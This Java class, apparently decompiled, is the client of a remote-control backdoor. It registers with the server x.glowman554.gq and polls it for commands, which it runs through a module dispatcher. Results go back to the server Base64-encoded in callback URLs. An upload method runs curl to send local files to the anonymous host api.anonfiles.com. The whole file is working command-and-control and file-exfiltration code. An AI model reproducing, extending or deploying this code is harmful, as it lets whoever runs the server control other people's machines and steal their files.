package gq.glowman554;

import gq.glowman554.modules.Modules;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Base64;
import java.util.Iterator;
import net.shadew.json.Json;
import net.shadew.json.JsonNode;
import net.shadew.json.JsonSyntaxException;

public class Exs {
    public final String base_url = "https://x.glowman554.gq/api/exs/";
    public Modules modules = new Modules(this);

    public Exs() {
    }

    public String register() throws IOException, JsonSyntaxException {
        String response = Http.request("https://x.glowman554.gq/api/exs/register");
        Json json = Json.json();
        JsonNode root = json.parse(response);
        return root.get("id").asString();
    }

    public void callback(String cid, String text) throws IOException {
        String url = String.format("%scallback?cid=%s", "https://x.glowman554.gq/api/exs/", cid);
        if (text != null) {
            url = url + "&text=" + Base64.getEncoder().encodeToString(text.getBytes());
        }

        Http.request(url);
    }

    public void pool_for_work() throws IOException, JsonSyntaxException {
        String work = Http.request("https://x.glowman554.gq/api/exs/command");
        Json json = Json.json();
        JsonNode root = json.parse(work);

        for(JsonNode node : root) {
            String command = node.get("key").asString();
            String cid = node.get("value").asString();

            try {
                this.modules.call(command, cid, this);
            } catch (Exception e) {
                if (Entry.debug) {
                    e.printStackTrace();
                }
            }
        }

    }

    public String upload(File f) throws IOException, InterruptedException {
        String command = String.format("curl -F file=@%s https://api.anonfiles.com/upload", f.getAbsolutePath());
        Process process = Runtime.getRuntime().exec(command);
        InputStreamReader inputStreamReader = new InputStreamReader(process.getInputStream());
        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
        String output = null;

        String full_output;
        for(full_output = ""; (output = bufferedReader.readLine()) != null; full_output = full_output + output + "\n") {
        }

        process.waitFor();
        bufferedReader.close();
        process.destroy();
        Json json = Json.json();
        JsonNode root = json.parse(full_output);
        return root.get("data").get("file").get("url").get("full").asString();
    }
}
